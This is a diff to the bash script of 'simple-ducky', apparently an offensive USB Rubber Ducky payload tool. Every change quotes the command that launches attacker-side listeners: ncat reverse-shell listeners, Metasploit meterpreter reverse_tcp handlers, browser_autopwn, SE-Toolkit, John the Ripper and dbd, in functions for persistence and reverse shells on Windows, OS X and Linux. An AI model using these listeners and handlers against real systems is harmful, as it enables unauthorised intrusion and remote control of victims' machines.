@@ -96,7 +96,7 @@ f_persistenceVIS7uac(){
 	if [ "$listener" == "n" ]; then
 		read -p "Would you like to return to the main menu [y/n]? " option
 	else 
-		x-terminal-emulator -e ncat -lvp $attackerport &
+		x-terminal-emulator -e "ncat -lvp $attackerport" &
 		xdg-open /usr/share/simple-ducky/ &
 		clear	
 		read -p "Would you like to return to the main menu [y/n]? " option
@@ -200,7 +200,7 @@ f_persistenceVIS7nouac(){
 	if [ "$listener" == "n" ]; then
 		read -p "Would you like to return to the main menu [y/n]? " option
 	else 
-		x-terminal-emulator -e ncat -lvp $attackerport &
+		x-terminal-emulator -e "ncat -lvp $attackerport" &
 		xdg-open /usr/share/simple-ducky/ &
 		clear	
 		read -p "Would you like to return to the main menu [y/n]? " option
@@ -304,7 +304,7 @@ f_persistenceWIN8uac(){
 	if [ "$listener" == "n" ]; then
 		read -p "Would you like to return to the main menu [y/n]? " option
 	else 
-		x-terminal-emulator -e ncat -lvp $attackerport &
+		x-terminal-emulator -e "ncat -lvp $attackerport" &
 		xdg-open /usr/share/simple-ducky/ &
 		clear	
 		read -p "Would you like to return to the main menu [y/n]? " option
@@ -408,7 +408,7 @@ f_persistenceWIN8nouac(){
 	if [ "$listener" == "n" ]; then
 		read -p "Would you like to return to the main menu [y/n]? " option
 	else 
-		x-terminal-emulator -e ncat -lvp $attackerport &
+		x-terminal-emulator -e "ncat -lvp $attackerport" &
 		xdg-open /usr/share/simple-ducky/ &
 		clear	
 		read -p "Would you like to return to the main menu [y/n]? " option
@@ -490,7 +490,7 @@ f_windowsrevW2KXP(){
 	if [ "$listener" == "n" ]; then
 		read -p "Would you like to return to the main menu [y/n]? " option
 	else 
-		x-terminal-emulator -e ncat -lvp $attackerport &
+		x-terminal-emulator -e "ncat -lvp $attackerport" &
 		xdg-open /usr/share/simple-ducky/ &
 		clear	
 		read -p "Would you like to return to the main menu [y/n]? " option
@@ -572,7 +572,7 @@ f_windowsrevVIS7uac(){
 	if [ "$listener" == "n" ]; then
 		read -p "Would you like to return to the main menu [y/n]? " option
 	else 
-		x-terminal-emulator -e ncat -lvp $attackerport &
+		x-terminal-emulator -e "ncat -lvp $attackerport" &
 		xdg-open /usr/share/simple-ducky/ &
 		clear	
 		read -p "Would you like to return to the main menu [y/n]? " option
@@ -654,11 +654,11 @@ f_windowsrevVIS7nouac(){
 	if [ "$listener" == "n" ]; then
 		read -p "Would you like to return to the main menu [y/n]? " option
 	else 
-		x-terminal-emulator -e ncat -lvp $attackerport &
-	xdg-open /usr/share/simple-ducky/ &
-	clear	
-	read -p "Would you like to return to the main menu [y/n]? " option
-	clear	
+		x-terminal-emulator -e "ncat -lvp $attackerport" &
+		xdg-open /usr/share/simple-ducky/ &
+		clear	
+		read -p "Would you like to return to the main menu [y/n]? " option
+		clear	
 	fi
 
 	
@@ -736,7 +736,7 @@ f_windowsrevWIN8uac(){
 	if [ "$listener" == "n" ]; then
 		read -p "Would you like to return to the main menu [y/n]? " option
 	else 
-		x-terminal-emulator -e ncat -lvp $attackerport &
+		x-terminal-emulator -e "ncat -lvp $attackerport" &
 		xdg-open /usr/share/simple-ducky/ &
 		clear	
 		read -p "Would you like to return to the main menu [y/n]? " option
@@ -818,11 +818,11 @@ f_windowsrevWIN8nouac(){
 	if [ "$listener" == "n" ]; then
 		read -p "Would you like to return to the main menu [y/n]? " option
 	else 
-		x-terminal-emulator -e ncat -lvp $attackerport &
-	xdg-open /usr/share/simple-ducky/ &
-	clear	
-	read -p "Would you like to return to the main menu [y/n]? " option
-	clear	
+		x-terminal-emulator -e "ncat -lvp $attackerport" &
+		xdg-open /usr/share/simple-ducky/ &
+		clear	
+		read -p "Would you like to return to the main menu [y/n]? " option
+		clear	
 	fi
 
 	
@@ -923,13 +923,13 @@ f_powershellVIS7(){
 	if [ "$listener" == "n" ]; then
 		read -p "Would you like to return to the main menu [y/n]? " option
 	elif [ "$payloadtype" == "met" ]; then
-		x-terminal-emulator -e msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport E &
+		x-terminal-emulator -e "msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport E" &
 		xdg-open /usr/share/simple-ducky/ &
 		service apache2 start
 		clear
 		read -p "Would you like to return to the main menu [y/n]? " option
 	else 
-		x-terminal-emulator -e ncat -lvp $attackerport &
+		x-terminal-emulator -e "ncat -lvp $attackerport" &
 		xdg-open /usr/share/simple-ducky/ &
 		service apache2 start
 		clear
@@ -1033,13 +1033,13 @@ f_powershellVIS7admuac(){
 	if [ "$listener" == "n" ]; then
 		read -p "Would you like to return to the main menu [y/n]? " option
 	elif [ "$payloadtype" == "met" ]; then
-		x-terminal-emulator -e msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport E &
+		x-terminal-emulator -e "msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport E" &
 		xdg-open /usr/share/simple-ducky/ &
 		service apache2 start
 		clear
 		read -p "Would you like to return to the main menu [y/n]? " option
 	else 
-		x-terminal-emulator -e ncat -lvp $attackerport &
+		x-terminal-emulator -e "ncat -lvp $attackerport" &
 		xdg-open /usr/share/simple-ducky/ &
 		service apache2 start
 		clear
@@ -1143,13 +1143,13 @@ f_powershellVIS7admnouac(){
 	if [ "$listener" == "n" ]; then
 		read -p "Would you like to return to the main menu [y/n]? " option
 	elif [ "$payloadtype" == "met" ]; then
-		x-terminal-emulator -e msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport E &
+		x-terminal-emulator -e "msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport E" &
 		xdg-open /usr/share/simple-ducky/ &
 		service apache2 start
 		clear
 		read -p "Would you like to return to the main menu [y/n]? " option
 	else 
-		x-terminal-emulator -e ncat -lvp $attackerport &
+		x-terminal-emulator -e "ncat -lvp $attackerport" &
 		xdg-open /usr/share/simple-ducky/ &
 		service apache2 start
 		clear
@@ -1253,13 +1253,13 @@ f_powershellWIN8(){
 	if [ "$listener" == "n" ]; then
 		read -p "Would you like to return to the main menu [y/n]? " option
 	elif [ "$payloadtype" == "met" ]; then
-		x-terminal-emulator -e msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport E &
+		x-terminal-emulator -e "msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport E" &
 		xdg-open /usr/share/simple-ducky/ &
 		service apache2 start
 		clear
 		read -p "Would you like to return to the main menu [y/n]? " option
 	else 
-		x-terminal-emulator -e ncat -lvp $attackerport &
+		x-terminal-emulator -e "ncat -lvp $attackerport" &
 		xdg-open /usr/share/simple-ducky/ &
 		service apache2 start
 		clear
@@ -1363,13 +1363,13 @@ f_powershellWIN8admuac(){
 	if [ "$listener" == "n" ]; then
 		read -p "Would you like to return to the main menu [y/n]? " option
 	elif [ "$payloadtype" == "met" ]; then
-		x-terminal-emulator -e msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport E &
+		x-terminal-emulator -e "msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport E" &
 		xdg-open /usr/share/simple-ducky/ &
 		service apache2 start
 		clear
 		read -p "Would you like to return to the main menu [y/n]? " option
 	else 
-		x-terminal-emulator -e ncat -lvp $attackerport &
+		x-terminal-emulator -e "ncat -lvp $attackerport" &
 		xdg-open /usr/share/simple-ducky/ &
 		service apache2 start
 		clear
@@ -1473,13 +1473,13 @@ f_powershellWIN8admnouac(){
 	if [ "$listener" == "n" ]; then
 		read -p "Would you like to return to the main menu [y/n]? " option
 	elif [ "$payloadtype" == "met" ]; then
-		x-terminal-emulator -e msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport E &
+		x-terminal-emulator -e "msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport E" &
 		xdg-open /usr/share/simple-ducky/ &
 		service apache2 start
 		clear
 		read -p "Would you like to return to the main menu [y/n]? " option
 	else 
-		x-terminal-emulator -e ncat -lvp $attackerport &
+		x-terminal-emulator -e "ncat -lvp $attackerport" &
 		xdg-open /usr/share/simple-ducky/ &
 		service apache2 start
 		clear
@@ -2873,7 +2873,7 @@ f_osxrev(){
 	if [ "$listener" == "n" ]; then
 		read -p "Would you like to return to the main menu [y/n]? " option
 	else 
-		x-terminal-emulator -e ncat -lvp $attackerport &
+		x-terminal-emulator -e "ncat -lvp $attackerport" &
 		xdg-open /usr/share/simple-ducky/ &
 		clear
 		read -p "Would you like to return to the main menu [y/n]? " option
@@ -2958,7 +2958,7 @@ f_osxsingleuserrev(){
 	if [ "$listener" == "n" ]; then
 		read -p "Would you like to return to the main menu [y/n]? " option
 	else 
-		x-terminal-emulator -e ncat -lvp $attackerport &
+		x-terminal-emulator -e "ncat -lvp $attackerport" &
 		xdg-open /usr/share/simple-ducky/ &
 		clear
 		read -p "Would you like to return to the main menu [y/n]? " option
@@ -3038,7 +3038,7 @@ f_linuxrev(){
 	if [ "$listener" == "n" ]; then
 		read -p "Would you like to return to the main menu [y/n]? " option
 	else 
-		x-terminal-emulator -e ncat -lvp $attackerport &
+		x-terminal-emulator -e "ncat -lvp $attackerport" &
 		xdg-open /usr/share/simple-ducky/ &
 		clear
 		read -p "Would you like to return to the main menu [y/n]? " option
@@ -3136,7 +3136,7 @@ f_setlocaldnsVIS7uac(){
 	echo -e "\e[1;34mLaunching the Socail Engineering Toolkit (se-toolkit).\e[0m" 
 	echo ""
 	sleep 2
-	x-terminal-emulator -e se-toolkit &
+	x-terminal-emulator -e "se-toolkit" &
 	clear
 	echo -e "\e[1;34mHere are some recommended settings for the SE-Toolkit. Make changes as you see fit...\e[0m" 
 	echo ""
@@ -3251,7 +3251,7 @@ f_setlocaldnsVIS7nouac(){
 	echo -e "\e[1;34mLaunching the Socail Engineering Toolkit (se-toolkit).\e[0m" 
 	echo ""
 	sleep 2
-	x-terminal-emulator -e se-toolkit &
+	x-terminal-emulator -e "se-toolkit" &
 	clear
 	echo -e "\e[1;34mHere are some recommended settings for the SE-Toolkit. Make changes as you see fit...\e[0m" 
 	echo ""
@@ -3366,7 +3366,7 @@ f_setlocaldnsWIN8uac(){
 	echo -e "\e[1;34mLaunching the Socail Engineering Toolkit (se-toolkit).\e[0m" 
 	echo ""
 	sleep 2
-	x-terminal-emulator -e se-toolkit &
+	x-terminal-emulator -e "se-toolkit" &
 	clear
 	echo -e "\e[1;34mHere are some recommended settings for the SE-Toolkit. Make changes as you see fit...\e[0m" 
 	echo ""
@@ -3481,7 +3481,7 @@ f_setlocaldnsWIN8nouac(){
 	echo -e "\e[1;34mLaunching the Socail Engineering Toolkit (se-toolkit).\e[0m" 
 	echo ""
 	sleep 2
-	x-terminal-emulator -e se-toolkit &
+	x-terminal-emulator -e "se-toolkit" &
 	clear
 	echo -e "\e[1;34mHere are some recommended settings for the SE-Toolkit. Make changes as you see fit...\e[0m" 
 	echo ""
@@ -3634,7 +3634,7 @@ f_autopwnlocaldnsVIS7uac(){
 	echo -e "\e[1;34mLaunching Metasploit's Browser_Autopwn auxilary module...\e[0m" 
 	echo ""
 	sleep 3
-	x-terminal-emulator -e msfcli auxiliary/server/browser_autopwn LHOST=$attackerip LPORT=$attackerport SRVPORT=8080 SRVHOST=0.0.0.0 URIPATH=/duck E &
+	x-terminal-emulator -e "msfcli auxiliary/server/browser_autopwn LHOST=$attackerip LPORT=$attackerport SRVPORT=8080 SRVHOST=0.0.0.0 URIPATH=/duck E" &
 	clear	
 	read -p "Would you like to return to the main menu [y/n]? " option
 	xdg-open /usr/share/simple-ducky/ &
@@ -3756,7 +3756,7 @@ f_autopwnlocaldnsVIS7nouac(){
 	echo -e "\e[1;34mLaunching Metasploit's Browser_Autopwn auxilary module...\e[0m" 
 	echo ""
 	sleep 3
-	x-terminal-emulator -e msfcli auxiliary/server/browser_autopwn LHOST=$attackerip LPORT=$attackerport SRVPORT=8080 SRVHOST=0.0.0.0 URIPATH=/duck E &
+	x-terminal-emulator -e "msfcli auxiliary/server/browser_autopwn LHOST=$attackerip LPORT=$attackerport SRVPORT=8080 SRVHOST=0.0.0.0 URIPATH=/duck E" &
 	clear	
 	read -p "Would you like to return to the main menu [y/n]? " option
 	xdg-open /usr/share/simple-ducky/ &
@@ -3878,7 +3878,7 @@ f_autopwnlocaldnsWIN8uac(){
 	echo -e "\e[1;34mLaunching Metasploit's Browser_Autopwn auxilary module...\e[0m" 
 	echo ""
 	sleep 3
-	x-terminal-emulator -e msfcli auxiliary/server/browser_autopwn LHOST=$attackerip LPORT=$attackerport SRVPORT=8080 SRVHOST=0.0.0.0 URIPATH=/duck E &
+	x-terminal-emulator -e "msfcli auxiliary/server/browser_autopwn LHOST=$attackerip LPORT=$attackerport SRVPORT=8080 SRVHOST=0.0.0.0 URIPATH=/duck E" &
 	clear	
 	read -p "Would you like to return to the main menu [y/n]? " option
 	xdg-open /usr/share/simple-ducky/ &
@@ -4000,7 +4000,7 @@ f_autopwnlocaldnsWIN8nouac(){
 	echo -e "\e[1;34mLaunching Metasploit's Browser_Autopwn auxilary module...\e[0m" 
 	echo ""
 	sleep 3
-	x-terminal-emulator -e msfcli auxiliary/server/browser_autopwn LHOST=$attackerip LPORT=$attackerport SRVPORT=8080 SRVHOST=0.0.0.0 URIPATH=/duck E &
+	x-terminal-emulator -e "msfcli auxiliary/server/browser_autopwn LHOST=$attackerip LPORT=$attackerport SRVPORT=8080 SRVHOST=0.0.0.0 URIPATH=/duck E" &
 	clear	
 	read -p "Would you like to return to the main menu [y/n]? " option
 	xdg-open /usr/share/simple-ducky/ &
@@ -4077,7 +4077,7 @@ f_proxyinthemiddleXPVIS7(){
 	echo -e "\e[1;34mLaunching Burp Suite...\e[0m" 
 	echo ""
 	sleep 2
-	x-terminal-emulator -e java -jar -Xmx1024m /usr/bin/burpsuite.jar &
+	x-terminal-emulator -e "java -jar -Xmx1024m /usr/bin/burpsuite.jar" &
 	clear
 	echo -e "\e[1;34mSet the following options in Burp Suite...\e[0m" 
 	echo ""
@@ -4174,7 +4174,7 @@ f_proxyinthemiddleWIN8(){
 	echo -e "\e[1;34mLaunching Burp Suite...\e[0m" 
 	echo ""
 	sleep 2
-	x-terminal-emulator -e java -jar -Xmx1024m /usr/bin/burpsuite.jar &
+	x-terminal-emulator -e "java -jar -Xmx1024m /usr/bin/burpsuite.jar" &
 	clear
 	echo -e "\e[1;34mSet the following options in Burp Suite...\e[0m" 
 	echo ""
@@ -4347,7 +4347,7 @@ f_lmntlmhasher(){
 	read -p "Would you like me to launch John [y|n]? " launchjohn
 	clear
 	if [ "$launchjohn" == "y" ]; then
-		x-terminal-emulator -e john hash.txt --format=nt2 &
+		x-terminal-emulator -e "john hash.txt --format=nt2" &
 		read -p "Would you like to return to the main menu [y/n]? " option
 	else
 		read -p "Would you like to return to the main menu [y/n]? " option
@@ -4556,7 +4556,7 @@ f_dbdbuilder(){
 		echo ""
 		
 			if [ "$listener" == "y" ]; then
-				x-terminal-emulator -e dbd -lvp $attackerport -k $attackersecret &
+				x-terminal-emulator -e "dbd -lvp $attackerport -k $attackersecret" &
 				read -p "Press any key to contiue" enter
 				clear
 				f_mainmenu
@@ -4625,7 +4625,7 @@ f_dbdbuilder(){
 		echo ""
 		
 			if [ "$listener" == "y" ]; then
-				x-terminal-emulator -e dbd -lvp $attackerport -k $attackersecret &
+				x-terminal-emulator -e "dbd -lvp $attackerport -k $attackersecret" &
 				read -p "Press any key to contiue" enter
 				clear
 				f_mainmenu
